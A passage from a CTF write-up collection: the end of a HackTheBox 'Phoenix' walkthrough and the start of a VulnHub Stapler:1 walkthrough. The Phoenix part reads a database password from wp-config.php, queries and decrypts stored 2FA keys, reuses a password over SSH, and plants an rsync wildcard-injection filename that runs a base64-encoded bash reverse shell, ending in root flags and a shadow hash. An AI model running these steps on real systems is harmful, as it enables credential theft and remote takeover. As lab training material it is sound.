         * The function unsets the session variables passed.
         *
         * @param array $variables - the array of session variables to be unset
         *
         * @return NA
         */
        public static function unset_session_variables( $variables ) {
                if ( gettype( $variables ) == "array" ) {
                        foreach ( $variables as $variable ) {
                                if ( isset( $_SESSION[ $variable ] ) ) {
                                        unset( $_SESSION[ $variable ] );
                                }
                        }
                } else {
                        if ( isset( $_SESSION[ $variables ] ) ) {
                                unset( $_SESSION[ $variables ] );
                        }
                }
        }

        /**
         * The function unsets the cookie variables passed.
         *
         * @param array $variables - the array of cookie variables to be unset
         *
         * @return NA
         */
        public static function unset_cookie_variables( $variables ) {

                if ( gettype( $variables ) == "array" ) {
                        foreach ( $variables as $variable ) {
                                if ( isset( $_COOKIE[ $variable ] ) ) {
                                        setcookie( $variable, '', time() - 3600,NULL,NULL,NULL, TRUE );
                                }
                        }
                } else {
                        if ( isset( $_COOKIE[ $variables ] ) ) {
                                setcookie( $variables, '', time() - 3600,NULL,NULL,NULL, TRUE );
                        }
                }

        }

        /**
         * The function unsets the temp table variables passed.
         *
         * @param array $variables - the array of temporary table variables to be unset
         * @param string $session_id - the session_id for which it should be destroyed
         *
         * @return NA
         */
        public static function unset_temp_user_details_in_table( $variables, $session_id, $command='' ) {
                global $Mo2fdbQueries;
                $key        = get_option( 'mo2f_encryption_key' );
                $session_id = MO2f_Utility::decrypt_data( $session_id, $key );
                if($command == "destroy"){
                        $Mo2fdbQueries->delete_user_login_sessions( $session_id );
                }else{
                        $Mo2fdbQueries->save_user_login_details( $session_id, array($variables => ''));
                }
        }



        /**
         * The function decodes the twofactor methods
         *
         * @param array $variables - the selected 2-factor method and the decode type.
         *
         * @return NA
         */
        public static function mo2f_decode_2_factor( $selected_2_factor_method, $decode_type ) {

                if ( $selected_2_factor_method == 'NONE' ) {
                        return $selected_2_factor_method;
                }else if($selected_2_factor_method == "OTP Over Email")
                {
                        $selected_2_factor_method = "OTPOverEmail";
                }


                $wpdb_2fa_methods = array(
                        "miniOrangeQRCodeAuthentication" => "miniOrange QR Code Authentication",
                        "miniOrangeSoftToken"            => "miniOrange Soft Token",
                        "miniOrangePushNotification"     => "miniOrange Push Notification",
                        "GoogleAuthenticator"            => "Google Authenticator",
                        "AuthyAuthenticator"             => "Authy Authenticator",
                        "SecurityQuestions"              => "Security Questions",
                        "EmailVerification"              => "Email Verification",
                        "OTPOverSMS"                     => "OTP Over SMS",
                        "OTPOverEmail"                                   => "OTP Over Email",
                        "DuoAuthenticator"               => "Duo Authenticator"
                );

                $server_2fa_methods = array(
                        "miniOrange QR Code Authentication" => "MOBILE AUTHENTICATION",
                        "miniOrange Soft Token"             => "SOFT TOKEN",
                        "miniOrange Push Notification"      => "PUSH NOTIFICATIONS",
                        "Google Authenticator"              => "GOOGLE AUTHENTICATOR",
                        "Authy Authenticator"               => "GOOGLE AUTHENTICATOR",
                        "Security Questions"                => "KBA",
                        "Email Verification"                => "OUT OF BAND EMAIL",
                        "OTP Over SMS"                      => "SMS",
                        "EMAIL"                             => "OTP Over Email",
                        "OTPOverEmail"                                          => "OTP Over Email",
                        "Duo Authenticator"                 => "Duo Authenticator",
                        "DUO AUTHENTICATOR"                                     => "Duo Authenticator",
                        "OTP Over Email"                                        => "EMAIL",
                        "OTP OVER EMAIL"                    => "EMAIL"

                );

                $server_to_wpdb_2fa_methods = array(
                        "MOBILE AUTHENTICATION" => "miniOrange QR Code Authentication",
                        "SOFT TOKEN"            => "miniOrange Soft Token",
                        "PUSH NOTIFICATIONS"    => "miniOrange Push Notification",
                        "GOOGLE AUTHENTICATOR"  => "Google Authenticator",
                        "KBA"                   => "Security Questions",
                        "OUT OF BAND EMAIL"     => "Email Verification",
                        "SMS"                   => "OTP Over SMS",
                        "EMAIL"                 => "OTP Over Email",
                        "OTPOverEmail"                  => "OTP Over Email",
                        "OTP OVER EMAIL"                => "OTP Over Email",
                        "OTP Over SMS"                  => "OTP Over SMS",
                        "Security Questions"    => "Security Questions",
                        "Google Authenticator"  => "Google Authenticator"
                );

                 $methodname='';
                if ( $decode_type == "wpdb" ) {
                        $methodname = isset($wpdb_2fa_methods[ $selected_2_factor_method ])?$wpdb_2fa_methods[ $selected_2_factor_method ]:$selected_2_factor_method;
                } else if ( $decode_type == "server" ) {
                        $methodname = isset($server_2fa_methods[ $selected_2_factor_method ])?$server_2fa_methods[ $selected_2_factor_method ]:$selected_2_factor_method;
                } else {
                        $methodname = isset($server_to_wpdb_2fa_methods[ $selected_2_factor_method ])?$server_to_wpdb_2fa_methods[ $selected_2_factor_method ]:$selected_2_factor_method;
                }
                return $methodname;

        }
        public static function is_same_method($method,$current_method){
                if($method == $current_method || $method == MO2f_Utility::mo2f_decode_2_factor($current_method,'wpdb') || $method == MO2f_Utility::mo2f_decode_2_factor($current_method,'') || MO2f_Utility::mo2f_decode_2_factor($current_method,'server') == $method)
                        return true;
                return false;
        }

        public static function get_plugin_name_by_identifier( $plugin_identitifier ){
                $all_plugins = get_plugins();
                $plugin_details = $all_plugins[$plugin_identitifier];

                return $plugin_details["Name"] ? $plugin_details["Name"] : "No Plugin selected" ;
        }
   
    public static function isBlank($value)
    {
        if (!isset($value) || empty($value)) return TRUE;
        return FALSE;
    }

    public static function get_index_value($var,$index){
        switch ($var) {
                case 'GLOBALS':
                        return isset($GLOBALS[$index])?$GLOBALS[$index]:false;
                        break;
    
                default:
                        return false;
                        break;
        }
        }

        public static function get_codes_email_content($codes){
        $message =  '<table cellpadding="25" style="margin:0px auto">
        <tbody>
        <tr>
        <td>
        <table cellpadding="24" width="584px" style="margin:0 auto;max-width:584px;background-color:#f6f4f4;border:1px solid #a8adad">
        <tbody>
        <tr>
        <td><img src="https://ci5.googleusercontent.com/proxy/10EQeM1udyBOkfD2dwxGhIaMXV4lOwCRtUecpsDkZISL0JIkOL2JhaYhVp54q6Sk656rW2rpAFJFEgGQiAOVcYIIKxXYMHHMNSNB=s0-d-e1-ft#https://login.xecurify.com/moas/images/xecurify-logo.png" style="color:#5fb336;text-decoration:none;display:block;width:auto;height:auto;max-height:35px" class="CToWUd"></td>
        </tr>
        </tbody>
        </table>
        <table cellpadding="24" style="background:#fff;border:1px solid #a8adad;width:584px;border-top:none;color:#4d4b48;font-family:Arial,Helvetica,sans-serif;font-size:13px;line-height:18px">
        <tbody>
        <tr>
        <td>
        <p style="margin-top:0;margin-bottom:20px">Dear Customer,</p>
        <p style="margin-top:0;margin-bottom:10px">You initiated a transaction from <b>WordPress 2 Factor Authentication Plugin</b>:</p>
        <p style="margin-top:0;margin-bottom:10px">Your backup codes are:-
        <table cellspacing="10">
            <tr>';
            for ($x = 0; $x < sizeof($codes); $x++) {
                        $message = $message.'<td>'.$codes[$x].'</td>';
                       
                }
        $message = $message.'</table></p>
        <p style="margin-top:0;margin-bottom:10px">Please use this carefully as each code can only be used once. Please do not share these codes with anyone.</p>
        <p style="margin-top:0;margin-bottom:10px">Also, we would highly recommend you to reconfigure your two-factor after logging in.</p>
        <p style="margin-top:0;margin-bottom:15px">Thank you,<br>miniOrange Team</p>
        <p style="margin-top:0;margin-bottom:0px;font-size:11px">Disclaimer: This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.</p>
        </div></div></td>
        </tr>
        </tbody>
        </table>
        </td>
        </tr>
        </tbody>
        </table>';
        return $message;
    }

    public static function get_codes_warning_email_content($codes_remaining){
        $message =  '<table cellpadding="25" style="margin:0px auto">
        <tbody>
        <tr>
        <td>
        <table cellpadding="24" width="584px" style="margin:0 auto;max-width:584px;background-color:#f6f4f4;border:1px solid #a8adad">
        <tbody>
        <tr>
        <td><img src="https://ci5.googleusercontent.com/proxy/10EQeM1udyBOkfD2dwxGhIaMXV4lOwCRtUecpsDkZISL0JIkOL2JhaYhVp54q6Sk656rW2rpAFJFEgGQiAOVcYIIKxXYMHHMNSNB=s0-d-e1-ft#https://login.xecurify.com/moas/images/xecurify-logo.png" style="color:#5fb336;text-decoration:none;display:block;width:auto;height:auto;max-height:35px" class="CToWUd"></td>
        </tr>
        </tbody>
        </table>
        <table cellpadding="24" style="background:#fff;border:1px solid #a8adad;width:584px;border-top:none;color:#4d4b48;font-family:Arial,Helvetica,sans-serif;font-size:13px;line-height:18px">
        <tbody>
        <tr>
        <td>
        <p style="margin-top:0;margin-bottom:20px">Dear Customer,</p>
        <p style="margin-top:0;margin-bottom:10px">You have '.$codes_remaining.' backup codes remaining. Kindly reconfigure your two-factor to avoid being locked out.</b></p>
        <p style="margin-top:0;margin-bottom:15px">Thank you,<br>miniOrange Team</p>
        <p style="margin-top:0;margin-bottom:0px;font-size:11px">Disclaimer: This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.</p>
        </div></div></td>
        </tr>
        </tbody>
        </table>
        </td>
        </tr>
        </tbody>
        </table>';
        return $message;
    }

    public static function mo2f_get_codes_hash($codes){
        $codes_hash=array();
        for ($x = 0; $x < sizeof($codes); $x++) {
            $str = $codes[$x];
            array_push($codes_hash,md5($str));
        }
        return $codes_hash;
    }

    public static function mo2f_email_backup_codes($codes, $mo2f_user_email){
        $subject    = '2-Factor Authentication(Backup Codes)';
        $headers    = array('Content-Type: text/html; charset=UTF-8');
        $message    = MO2f_Utility::get_codes_email_content($codes);
        $result     = wp_mail($mo2f_user_email,$subject,$message,$headers);
        return $result;
    }

    public static function mo2f_download_backup_codes($id, $codes){
        update_user_meta($id, 'mo_backup_code_downloaded', 1);
        header('Content-Disposition: attachment; filename=miniOrange2-factor-BackupCodes.txt');
        echo "Two Factor Backup Codes:".PHP_EOL.PHP_EOL;
        echo "These are the codes that can be used in case you lose your phone or cannot access your email. Please reconfigure your authentication method after login.".PHP_EOL."Please use this carefully as each code can only be used once. Please do not share these codes with anyone..".PHP_EOL.PHP_EOL;
        for ($x = 0; $x < sizeof($codes); $x++){
            $str1= $codes[$x];
            echo(($x+1).". ".$str1." ");
        }
                                
        exit;
    }

    public static function mo2f_debug_file($text){
        if(MoWpnsUtility::get_mo2f_db_option('mo2f_enable_debug_log', 'site_option') == 1){
                $debug_log_path = wp_upload_dir();
                $debug_log_path = $debug_log_path['basedir'].DIRECTORY_SEPARATOR;
                $filename = 'miniorange_debug_log.txt';
                $data = '[' . date("Y/m/d").' '. time().']:'.$text."\n";
                $handle = fopen($debug_log_path.DIRECTORY_SEPARATOR.$filename,'a+');
                        fwrite($handle,$data);
                        fclose($handle);
        }
    }


    public static function mo2f_mail_and_download_codes(){
      global $Mo2fdbQueries;
       
        $id = get_current_user_id();
        $mo2f_user_email = $Mo2fdbQueries->get_user_detail( 'mo2f_user_email', $id );
        if(empty($mo2f_user_email)){
            $currentuser = get_user_by( 'id', $id );
            $mo2f_user_email = $currentuser->user_email;
        }
        $generate_backup_code = new Customer_Cloud_Setup();
        $codes=$generate_backup_code->mo_2f_generate_backup_codes($mo2f_user_email, site_url());
         
        if($codes == 'LimitReached'|| $codes == 'UserLimitReached' || $codes == 'AllUsed' || $codes == 'invalid_request')
                return $codes;

        $codes = explode(' ', $codes);
        $codes_hash=MO2f_Utility::mo2f_get_codes_hash($codes);
        $result = MO2f_Utility::mo2f_email_backup_codes($codes, $mo2f_user_email);
        update_user_meta($id, 'mo_backup_code_generated', 1);
        update_user_meta($id, 'mo_backup_code_downloaded', 1);
        MO2f_Utility::mo2f_download_backup_codes($id, $codes);
    }


}

?>
```

then We can grab the wordpress login from the wp-config.php file:

``` bash
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', '<++32%himself%FIRM%section%32++>' );
define( 'DB_HOST', 'localhost:/var/run/mysqld/mysqld.sock' );
```

then connect to mysql to get more information:

``` bash
wp_user@phoenix:/$ mysql -uwordpress -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2823
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select meta_value from wp_usermeta WHERE meta_key IN ('mo2f_gauth_key');
+--------------------------------------------------------------------------------------------------------------+
| meta_value                                                                                                   |
+--------------------------------------------------------------------------------------------------------------+
| qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA= |
| mFeor0xmxMGd4ncJhPAuPGM6HXap6neH469PGQ2wVj23TuAYSULMTQTnQcH4SgnaO7BVPok5rTc4vqxYMYZCFNJC35KeyByT3cF05m27lvI= |
+--------------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> select meta_value from wp_usermeta WHERE meta_key IN ('mo2f_get_auth_rnd_string');
+------------+
| meta_value |
+------------+
| kHHxxX3f   |
| M6EwACNR   |
+------------+
2 rows in set (0.00 sec)
```

and then easily write an decrypt exp php file to get the key:

``` bash
<?php
function decrypt_data($data, $key) {
                $c = base64_decode($data);
                $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
                $iv = substr($c, 0, $ivlen);
                $hmac = substr($c, $ivlen, $sha2len=32);
                $ciphertext_raw = substr($c, $ivlen+$sha2len);
                $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
                $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);


                return $original_plaintext;
        }
echo decrypt_data("qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA=","kHHxxX3f");
?>
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# php exp.php                                          
PDEEWIVJSIDWS6WO
```

then we can use OPT dynamic code to login:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2188.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2189.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2190.jpg)

but login is no use for later movement, we just need to known there is a way to this

#### User own

We can completely bypass the 2FA by renaming the plugin over at /opt/wordpress/ but it doesn’t get us much further than we already are. 

Instead back to using SSH, we can look into bypassing the 2FA completely (for ssh this time, not wordpress), in the /etc/pam.d/ssh config, we see reference to an accessfile:

read more about it:

 - [pam_google_authenticator](https://manpages.ubuntu.com/manpages/bionic/man8/pam_google_authenticator.8.html)

``` bash
auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf

wp_user@phoenix:~/wordpress$ cat /etc/security/access-local.conf
+ : ALL : 10.11.12.13/24
- : ALL : ALL
```

We need to connect from an IP on the 10.11.2.13/24 subnet, which we can’t do from our machine or locally from the other machine. so we use ssh command in the wp_user shell:

We finally SSH over to the box, reusing editor‘s password:

``` bash
wp_user@phoenix:~/wordpress$ ssh editor@10.11.12.13
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password: superphoenix
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Mar 2022 07:03:51 AM UTC

  System load:             0.0
  Usage of /:              70.3% of 4.36GB
  Memory usage:            26%
  Swap usage:              0%
  Processes:               244
  Users logged in:         0
  IPv4 address for ens160: 10.10.11.149
  IPv6 address for ens160: dead:beef::250:56ff:feb9:ce55
  IPv4 address for eth0:   10.11.12.13


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 23 18:41:06 2022 from 10.11.12.13
editor@phoenix:~$ id
uid=1002(editor) gid=1002(editor) groups=1002(editor)
editor@phoenix:~$ whoami
editor
editor@phoenix:~$ cat user.txt 
8c36b4a1e1ba0a43169f10a1d0975fee
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2191.jpg)

#### Root own

we found a cron job file in 

``` bash
editor@phoenix:/dev/shm$ find /usr/local/bin/ -perm -o=x -type f 2>/dev/null
/usr/local/bin/cron.sh.x
```

We can run pspy however we can’t see processes from other users. Enumerating the box more, we find cron.sh.x, if we run this manually and see what it’s doing:

``` bash
2022/03/23 19:15:04 CMD: UID=1002 PID=50487  | /usr/local/bin/cron.sh.x -c exec '/usr/local/bin/cron.sh.x' "$@" /usr/local/bin/cron.sh.x
2022/03/23 19:15:04 CMD: UID=1002 PID=50489  | mysqldump -u root wordpress 
2022/03/23 19:15:04 CMD: UID=1002 PID=50490  | tar -cf phoenix.htb.2022-03-23-19-15.tar dbbackup.sql 
2022/03/23 19:15:04 CMD: UID=1002 PID=50491  | rm dbbackup.sql 
2022/03/23 19:15:04 CMD: UID=1002 PID=50492  | gzip -9 phoenix.htb.2022-03-23-19-15.tar 
2022/03/23 19:15:20 CMD: UID=1002 PID=50493  | find . -type f -mmin +30 -delete 
2022/03/23 19:15:20 CMD: UID=1002 PID=50494  | rsync --ignore-existing -t phoenix.htb.2022-03-23-18-48.tar.gz phoenix.htb.2022-03-23-18-51.tar.gz phoenix.htb.2022-03-23-18-54.tar.gz phoenix.htb.2022-03-23-18-57.tar.gz phoenix.htb.2022-03-23-19-00.tar.gz phoenix.htb.2022-03-23-19-03.tar.gz phoenix.htb.2022-03-23-19-05.tar.gz phoenix.htb.2022-03-23-19-06.tar.gz phoenix.htb.2022-03-23-19-09.tar.gz phoenix.htb.2022-03-23-19-12.tar.gz phoenix.htb.2022-03-23-19-15.tar.gz jit@10.11.12.14:/backups/
2022/03/23 19:15:20 CMD: UID=1002 PID=50495  | ssh -l jit 10.11.12.14 rsync --server -te.LsfxC --ignore-existing . /backups/
```

It seems to use a few wild cards. We can try exploit this line:

``` bash
rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/
```

We can see some article here:

 - [gtfobins-rsync](https://gtfobins.github.io/gtfobins/rsync/)

 - [Wildcards Spare tricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks)

We can create 2 files in /backups to exploit this:

``` bash
echo "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwLzEyMzQgMD4mMQ==|base64 -d|bash" > shell.sh

touch -- "-e sh shell.sh"

editor@phoenix:/backups$ chmod +x shell.sh
editor@phoenix:/backups$ chmod +x -- '-e sh shell.sh'
editor@phoenix:/backups$ ls -la
total 5300
drwxr-x---  2 editor editor   4096 Mar 23 19:39  .
drwxr-xr-x 20 root   root     4096 Feb 25 19:40  ..
-rwxrwxr-x  1 editor editor      0 Mar 23 19:38 '-e sh shell.sh'
-rw-r--r--  1 root   root   675305 Mar 23 19:12  phoenix.htb.2022-03-23-19-12.tar.gz
-rw-rw-r--  1 editor editor    151 Mar 23 19:15  phoenix.htb.2022-03-23-19-15.tar.gz
-rw-r--r--  1 root   root   675308 Mar 23 19:18  phoenix.htb.2022-03-23-19-18.tar.gz
-rw-r--r--  1 root   root   675308 Mar 23 19:21  phoenix.htb.2022-03-23-19-21.tar.gz
-rw-r--r--  1 root   root   675303 Mar 23 19:24  phoenix.htb.2022-03-23-19-24.tar.gz
-rw-rw-r--  1 editor editor    152 Mar 23 19:27  phoenix.htb.2022-03-23-19-27.tar.gz
-rw-r--r--  1 root   root   675307 Mar 23 19:30  phoenix.htb.2022-03-23-19-30.tar.gz
-rw-r--r--  1 root   root   675307 Mar 23 19:33  phoenix.htb.2022-03-23-19-33.tar.gz
-rw-r--r--  1 root   root   675308 Mar 23 19:36  phoenix.htb.2022-03-23-19-36.tar.gz
-rw-r--r--  1 root   root   675308 Mar 23 19:39  phoenix.htb.2022-03-23-19-39.tar.gz
-rwxrwxr-x  1 editor editor     85 Mar 23 19:39  shell.sh
```

after 3 minutes, we got a root shell:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# nc -lvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.149.
Ncat: Connection from 10.10.11.149:34274.
bash: cannot set terminal process group (50726): Inappropriate ioctl for device
bash: no job control in this shell
root@phoenix:/backups# cat /root/root.txt
cat /root/root.txt
258b721224d4a73b09b555077a962004
root@phoenix:/backups# cat /etc/shadow | grep root
cat /etc/shadow | grep root
root:$6$U6DRf4846rMqwA5E$Bwo3RxRA1t15bx6xvX8fVZ1cNfMoFVkpwyoWcK2gz3HRX16/d.zqHlQI68v8drjuFWucpXhRYpIbnhg35.Vjc0:18944:0:99999:7:::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2192.jpg)

#### Summary of knowledge

 - wordpress enumeration
 - Asgaros Forum < 2.0.0 plugin - Subscriber+ Blind SQL Injection
 - john crack wordpress hash
 - Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload to get shell
 - OPT KEY decrypt
 - bypass linux 2FA
 - use cron job file rsync process to privesc

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end phoenix -->

</details>

<a id="case-stapler-1"></a>

## 插件文件读取与数据库写入

WordPress 插件、MySQL 文件权限、历史记录和内核分支是原文的多种路径。每条成功与失败记录继续并列呈现。

<p class="kb-provenance">来源 Stapler-1 · 原记录 2020-04-13 · 26 个代码块 · 3 处图片引用</p>

<details class="kb-evidence" id="record-stapler-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Stapler-1 -->

#### 名称
名称：Stapler: 1
发布日期：2016年6月8日

#### 下载

Stapler.zip

 - Download (Mirror): https://download.vulnhub.com/stapler/Stapler.zip
 - Download (Torrent): https://download.vulnhub.com/stapler/Stapler.zip.torrent



#### 描述

``` bash
+---------------------------------------------------------+
|                                                         |
|                                  __..--''\              |
|                          __..--''         \             |
|                  __..--''          __..--''             |
|          __..--''          __..--''       |             |
|          \ o        __..--''____....----""              |
|           \__..--''\                                    |
|           |         \                                   |
|          +----------------------------------+           |
|          +----------------------------------+           |
|                                                         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|   名称: Stapler           |          IP: DHCP           |
|   日期: 2016-June-08      |        目标: Get Root!      |
|   作者: g0tmi1k           |        难度: ??? ;)         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|                                                         |
| + 一般的初级/中级虚拟机，只有几个拐点                      |
|   + 可能会觉得容易/困难(取决于你的水平)                    |
|   + ...还有攻击box的方式                                 |
|                                                         |
| + 它应该在VMware和Virtualbox上都能工作                    |
|   + 如果更改了网络模式，请重新启动VM                       |
|   + Fusion用户，需要在导入时重试                          |
|                                                         |
| + 有多种方法来执行此机器                                  |
|   + 至少有两(2)条路径可以得到有限制的shell                 |
|   + 至少有三种方法可以获得root访问权                       |
|                                                         |
| + 为2016年伦敦BsidesLondon定制                           |
|   + Slides: https://download.vulnhub.com/media/stapler/ |
|                                                         |
| + Thanks g0tmi1k, nullmode, rasta_mouse & superkojiman  |
|   + …向VulnHub-CTF团队大喊一声=)        |
|                                                         |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                                                         |
|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
|                                                         |
+---------------------------------------------------------+
```

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.122
Host is up (0.00013s latency).
MAC Address: 08:00:27:03:5A:E4 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -sV -v -p- 192.168.56.122
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

``` bash
root@kali:~# nmap -A -T4 -v --script=vuln -p 21,22,53,80,139,666,3306,12380 192.168.56.122
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
53/tcp    open  domain      dnsmasq 2.75
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http        PHP cli server 5.5 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
666/tcp   open  doom?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 4.4
Uptime guess: 0.016 days (since Mon Apr 13 03:19:38 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
